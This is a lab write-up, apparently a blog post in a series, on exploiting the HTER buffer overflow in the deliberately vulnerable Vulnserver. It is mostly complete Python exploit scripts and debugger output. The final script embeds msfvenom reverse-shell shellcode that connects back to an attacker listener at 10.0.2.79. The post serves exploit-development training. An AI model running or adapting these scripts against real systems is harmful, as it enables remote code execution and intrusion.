---
title: "Vulnserver Part 3 - HTER"
published: 2021-09-30T12:01:00-04:00
updated: 2021-09-30T12:01:00-04:00
categories:
  - writeup
tags:
  - vulnserver
  - windows
  - bufferoverflow
  - binary
  - exploit
  - bof
summary: This third part of our Vulnserver series looks rather easy at first. The buffer overflow can be done without any fuzzing. But once we look at the stack we find our input bytes have been... 
---

This third part of [our Vulnserver series](/posts/vulnserver_0_overview.html) looks rather easy at first. The buffer overflow can be done without any fuzzing. But once we look at the stack we find our input bytes have been changed. 

- [Proof of Concept](#proof-of-concept)
- [Stack Confusion](#stack-confusion)
- [EIP Offset](#eip-offset)
- [Conversion](#conversion)
- [Bad Characters](#bad-characters)
- [JMP ESP](#jmp-esp)
- [Pop Calc](#pop-calc)
- [Exploit](#exploit)


## Proof of Concept

A crash can be achieved with a simple buffer containing the "HTER " command and a large number of "A" (0x41) bytes. 

I got it with my first attempt:

```python
buf = b''
buf += b'HTER '
buf += b'A' * 4096
```


You should also be able to discover this with the fuzzers we have seen in the previous two Vulnserver writeups. The fuzzer we have used previously found the crash using 2048 * "C" bytes.

Here is the full PoC:

```python
#!/usr/bin/env python3
# HTER
# Step 1 - cause a crash / proof of concept
import socket

size = 4096
target_ip = "10.0.2.74"
target_port = 9999

buf = b""
buf += b"HTER "
buf += b"A" * size
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# script should get stuck here if it works

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

![hter crash](/assets/img/vulnserver_hter_10_poc.png)

## Stack Confusion

The PoC successfully crashes the server. But you can observe odd behavior:

```bash
00DEF5B8   00DEF5C8
00DEF5BC   00744A08
00DEF5C0   00740000
00DEF5C4   00000103
00DEF5C8   AAAAAAAA
00DEF5CC   AAAAAAAA
00DEF5D0   AAAAAAAA
00DEF5D4   AAAAAAAA
00DEF5D8   AAAAAAAA
00DEF5DC   AAAAAAAA
00DEF5E0   AAAAAAAA
```

Our `b'A'` input bytes get turned into the hex values `0xA` directly instead of their `0x41` byte values that you would normally expect. 

And the server does not crash when you send some characters outside of the hex range [0-9a-f] (e.g. a payload like `b"gghhiijj" * 1024`).

So I changed it to:

```python
size = 2048
buf = b""
buf += b"HTER "
buf += b"41" * size
buf += b"\n"
```

The result is still not as expected:
```bash
0102F5C8   14141414
0102F5CC   14141414
0102F5D0   14141414
0102F5D4   14141414
0102F5D8   14141414
0102F5DC   14141414
```

Our b"41" input appears to get changed to b"14".

I fought with this challenge for a while and thought maybe the nibbles of the bytes get reversed (Note: 1 Byte = 2 Nibbles).

To figure out what happens I sent this:

```python
buf += b"11223344" * size
```

I got a vastly different result:

```bash
010FF5C8   41342312
010FF5CC   41342312
010FF5D0   41342312
010FF5D4   41342312
010FF5D8   41342312
010FF5DC   41342312
```

And this was even more confusing.

As it turns out this is just an alignment issue.

Each character we sent after the `b"HTER "` string gets turned into one nibble (half) of a byte. But the first character we send after this string is not part of a clean four byte (32 bit) stack segment.

Together with the little endian byte order we get that odd looking pattern where you have `[0x11, 0x22, 0x33 0x44]` getting turned into `[0x12, 0x23, 0x34, 0x41]` (big endian representation) or `[0x41, 0x34, 0x23, 0x12]` (little endian representation). The entire 4 byte pattern is shifted by that one nibble `0x1` at the start.

We can correct for this by adding one arbitrary character in the hex range after the `b"HTER "`.

```python
size = 1024
buf = b""
buf += b"HTER "
buf += b"f" # arbitrary hex character for alignment
buf += (b"11223344" + b"aabbccdd") * size # test string
```

Now the result looks as you would expect:

```bash
00FDF5C4   00000103
00FDF5C8   44332211
00FDF5CC   DDCCBBAA
00FDF5D0   44332211
00FDF5D4   DDCCBBAA
00FDF5D8   44332211
00FDF5DC   DDCCBBAA
00FDF5E0   44332211
00FDF5E4   DDCCBBAA
```

![hter alignment](/assets/img/vulnserver_hter_20_alignment.png)


## EIP Offset

Creating an offset pattern would be too much of a hassle to figure out so I just approximated a value for the offset using divide and conquer:

* If you have a total buffer size 2048, then you start with an offset of 1024
    * If the EIP overwrite ends up before your B's then you try 512 next
    * Else try 1024 + 512 = 1536 next
* Repeat this dividing process until your guessed offset is close enough to where the EIP overwrite ends up that you can just count the byte difference

In this particular case it turned out to be rather easy to guess:

I tried 1024 and the EIP was only 4 bytes off.

```python
size = 2048
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"

offset = 1020

buf = b""
buf += b"HTER "
buf += b"f" # alignment
buf += b"41" * offset
buf += b"42" * 4
buf += b"43" * 4
buf += b"44" * (size - int(len(buf) / 2))
buf += b"\n"
```

![EIP and ESP under control](/assets/img/vulnserver_hter_30_eip_control.png)

## Conversion

Converting individual bytes into a hex string is rather easy in python3:

```bash
$ python3
>>> 
>>> test = b"A"
>>> test
b'A'
>>> test.hex()
'41'
```

It is also easy to turn that ascii hex string into bytes:

```bash
>>> test.hex().encode("utf-8")
b'41'
```

Put together this converter function allows us to convert our shellcode:

```python
def bytes_to_hexbytestring(b):
    hexstring = b.hex()
    bytestring = hexstring.encode("utf-8")
    return bytestring

a = b'\x90\x90\x90\x90'
b = bytes_to_hexbytestring(a)

print(a)
# b'\x90\x90\x90\x90'

print(b)
# b'90909090'
```

## Bad Characters

We have to customize the bad char generator a bit for this.

```python
badchars = [ 0x00, 0x0a ] # found badchars to exclude from the test
badstring_ascii = ""
badstring = b""
for x in range(1,256):
    if(x not in badchars):
        badstring += bytes([x])
        badstring_ascii += bytes([x]).hex() # hex() returns a string

badstring_converted = badstring_ascii.encode() # turn string into byte string
```

The `badstring` content we will write to a file like always. The `badstring_converted` we will actually send to the target.

Like before, I transfered the `badchars.bin` file via samba to the Windows target machine.

```python
# write generated badchars to file for mona
f = open('/srv/samba/protected/badchars.bin', 'wb')
f.write(badstring)
f.close()

buf = b""
buf += b"HTER "
buf += b"f"
buf += b"41" * 1020 # A
buf += b"42" * 4 # B
buf += b"43" * 4 # C
buf += badstring_converted
buf += b"44" * (size - int(len(buf) / 2) - int( len(badstring_converted) / 2) ) # D
buf += b"\n"
```

![Compare badchar test string](/assets/img/vulnserver_hter_40_badchars.png)


Mona does not find any other badchars:

```bash
!mona compare -f Y:\badchars.bin -a 00EBF9CC
unmodified
```

![Compare badchar test string](/assets/img/vulnserver_hter_44_badchars.png)

## JMP ESP

We can re-use the JMP ESP address we found for TRUN. But for completness sake, here are the mona commands again.

Find modules without protections:

```bash
!mona modules

modules with disables protections:

Message= 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\IEUser\Desktop\vulnserver.exe)
Message= 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\IEUser\Desktop\essfunc.dll)
```

The metasploit tool `msf-nasm_shell` gives us the right byte sequence to search for:

```bash
$ msf-nasm_shell

nasm > jmp esp
00000000 FFE4 jmp esp
```

Find the byte sequence for JMP ESP `FFE4` in the previously identified modules.

```bash
!mona find -s "\xff\xe4" -m essfunc.dll
    0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
    0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
      Found a total of 9 pointers
```

The first address does not contain any of our badchars and is executable so it should be usable.

We have to turn the address into a hex string in little endian byte order and then we can insert it where our `BBBB` were.

```python
#!/usr/bin/env python3
# Simple socket buffer overflow
# Step 5 - JMP ESP
import socket
import struct

def bytes_to_hexbytestring(b):
    hexstring = b.hex()
    bytestring = hexstring.encode("utf-8")
    return bytestring

offset = 1020
size = 2048
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ]

# esp_gadget_address = 0x625011af
# esp_gadget = struct.pack("<I", esp_gadget_address)
# print(esp_gaddget.hex())
# af 11 50 62
# af115062

buf = b""
buf += b"HTER "
buf += b"f"
buf += b"41" * 1020
buf += b'af115062' # jmp esp
buf += b"43" * 4
buf += b"44" * (size - int(len(buf) / 2))
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")

```

Reset and unpause the server.

Before you run this script go to address `625011af` with the black arrow in the menu and set a breakpoint on this address with `<F2>`

Once you run the exploit you should hit the breakpoint. When you skip ahead with `<F7>` the EIP should end up in our `CCCC` section after performing the `JMP ESP` instruction.

![JMP ESP](/assets/img/vulnserver_hter_50_jmp_esp.png)


## Pop Calc

Msfvenom once again creates the necessary shellcode for us:

```bash
$ msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A' -f python -v payload
```

Once you run it through our converter function the shellcode becomes usable:

```python
#!/usr/bin/env python3
# HTER
# Step 6 - pop calc
import socket

def bytes_to_hexbytestring(b):
    hexstring = b.hex()
    bytestring = hexstring.encode("utf-8")
    return bytestring

offset = 1020
size = 2048
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ] # found badchars to exclude. We can assume 0x00 and 0x0a (new line) are bad chars without trying
NOP = b"\x90"

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A' -f python -v payload
payload =  b""
payload += b"\xdb\xd7\xbe\x81\x73\xbe\xe6\xd9\x74\x24\xf4\x5a"
payload += b"\x33\xc9\xb1\x31\x83\xc2\x04\x31\x72\x14\x03\x72"
payload += b"\x95\x91\x4b\x1a\x7d\xd7\xb4\xe3\x7d\xb8\x3d\x06"
payload += b"\x4c\xf8\x5a\x42\xfe\xc8\x29\x06\xf2\xa3\x7c\xb3"
payload += b"\x81\xc6\xa8\xb4\x22\x6c\x8f\xfb\xb3\xdd\xf3\x9a"
payload += b"\x37\x1c\x20\x7d\x06\xef\x35\x7c\x4f\x12\xb7\x2c"
payload += b"\x18\x58\x6a\xc1\x2d\x14\xb7\x6a\x7d\xb8\xbf\x8f"
payload += b"\x35\xbb\xee\x01\x4e\xe2\x30\xa3\x83\x9e\x78\xbb"
payload += b"\xc0\x9b\x33\x30\x32\x57\xc2\x90\x0b\x98\x69\xdd"
payload += b"\xa4\x6b\x73\x19\x02\x94\x06\x53\x71\x29\x11\xa0"
payload += b"\x08\xf5\x94\x33\xaa\x7e\x0e\x98\x4b\x52\xc9\x6b"
payload += b"\x47\x1f\x9d\x34\x4b\x9e\x72\x4f\x77\x2b\x75\x80"
payload += b"\xfe\x6f\x52\x04\x5b\x2b\xfb\x1d\x01\x9a\x04\x7d"
payload += b"\xea\x43\xa1\xf5\x06\x97\xd8\x57\x4c\x66\x6e\xe2"
payload += b"\x22\x68\x70\xed\x12\x01\x41\x66\xfd\x56\x5e\xad"
payload += b"\xba\xa9\x14\xec\xea\x21\xf1\x64\xaf\x2f\x02\x53"
payload += b"\xf3\x49\x81\x56\x8b\xad\x99\x12\x8e\xea\x1d\xce"
payload += b"\xe2\x63\xc8\xf0\x51\x83\xd9\x92\x34\x17\x81\x7a"
payload += b"\xd3\x9f\x20\x83"

buf = b""
buf += b"HTER "
buf += b"f"
buf += b"41" * 1020
buf += b'af115062' # jmp esp
buf += bytes_to_hexbytestring(NOP * 16)
buf += bytes_to_hexbytestring(payload)
buf += b"44" * (size - int(len(buf) / 2))
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Calculator pops:

![Pop calc](/assets/img/vulnserver_hter_60_calc.png)


## Exploit

Now that we know we can run shellcode, we can actually send ourselves a reverse shell:

```python
#!/usr/bin/env python3
# HTER
# Step 7 - final exploit
import socket

def bytes_to_hexbytestring(b):
    hexstring = b.hex()
    bytestring = hexstring.encode("utf-8")
    return bytestring

offset = 1020
size = 2048
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a
badchars = [ 0x00, 0x0a ] # found badchars to exclude. We can assume 0x00 and 0x0a (new line) are bad chars without trying
NOP = b"\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=thread
payload =  b""
payload += b"\xdb\xcf\xd9\x74\x24\xf4\x5a\xbb\x52\xbf\xb0\x52"
payload += b"\x33\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x08"
payload += b"\xac\x52\xa7\x50\x3a\x10\x48\xa8\xbb\x75\xc0\x4d"
payload += b"\x8a\xb5\xb6\x06\xbd\x05\xbc\x4a\x32\xed\x90\x7e"
payload += b"\xc1\x83\x3c\x71\x62\x29\x1b\xbc\x73\x02\x5f\xdf"
payload += b"\xf7\x59\x8c\x3f\xc9\x91\xc1\x3e\x0e\xcf\x28\x12"
payload += b"\xc7\x9b\x9f\x82\x6c\xd1\x23\x29\x3e\xf7\x23\xce"
payload += b"\xf7\xf6\x02\x41\x83\xa0\x84\x60\x40\xd9\x8c\x7a"
payload += b"\x85\xe4\x47\xf1\x7d\x92\x59\xd3\x4f\x5b\xf5\x1a"
payload += b"\x60\xae\x07\x5b\x47\x51\x72\x95\xbb\xec\x85\x62"
payload += b"\xc1\x2a\x03\x70\x61\xb8\xb3\x5c\x93\x6d\x25\x17"
payload += b"\x9f\xda\x21\x7f\xbc\xdd\xe6\xf4\xb8\x56\x09\xda"
payload += b"\x48\x2c\x2e\xfe\x11\xf6\x4f\xa7\xff\x59\x6f\xb7"
payload += b"\x5f\x05\xd5\xbc\x72\x52\x64\x9f\x1a\x97\x45\x1f"
payload += b"\xdb\xbf\xde\x6c\xe9\x60\x75\xfa\x41\xe8\x53\xfd"
payload += b"\xa6\xc3\x24\x91\x58\xec\x54\xb8\x9e\xb8\x04\xd2"
payload += b"\x37\xc1\xce\x22\xb7\x14\x40\x72\x17\xc7\x21\x22"
payload += b"\xd7\xb7\xc9\x28\xd8\xe8\xea\x53\x32\x81\x81\xae"
payload += b"\xd5\xa4\x55\xb2\x6a\xd1\x57\xb2\x74\x14\xd1\x54"
payload += b"\x1e\x46\xb7\xcf\xb7\xff\x92\x9b\x26\xff\x08\xe6"
payload += b"\x69\x8b\xbe\x17\x27\x7c\xca\x0b\xd0\x8c\x81\x71"
payload += b"\x77\x92\x3f\x1d\x1b\x01\xa4\xdd\x52\x3a\x73\x8a"
payload += b"\x33\x8c\x8a\x5e\xae\xb7\x24\x7c\x33\x21\x0e\xc4"
payload += b"\xe8\x92\x91\xc5\x7d\xae\xb5\xd5\xbb\x2f\xf2\x81"
payload += b"\x13\x66\xac\x7f\xd2\xd0\x1e\x29\x8c\x8f\xc8\xbd"
payload += b"\x49\xfc\xca\xbb\x55\x29\xbd\x23\xe7\x84\xf8\x5c"
payload += b"\xc8\x40\x0d\x25\x34\xf1\xf2\xfc\xfc\x11\x11\xd4"
payload += b"\x08\xba\x8c\xbd\xb0\xa7\x2e\x68\xf6\xd1\xac\x98"
payload += b"\x87\x25\xac\xe9\x82\x62\x6a\x02\xff\xfb\x1f\x24"
payload += b"\xac\xfc\x35"

buf = b""
buf += b"HTER "
buf += b"f"
buf += b"41" * 1020
buf += b'af115062' # jmp esp
buf += bytes_to_hexbytestring(NOP * 16)
buf += bytes_to_hexbytestring(payload)
buf += b"44" * (size - int(len(buf) / 2))
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

![Pop revshell](/assets/img/vulnserver_hter_70_revshell.png)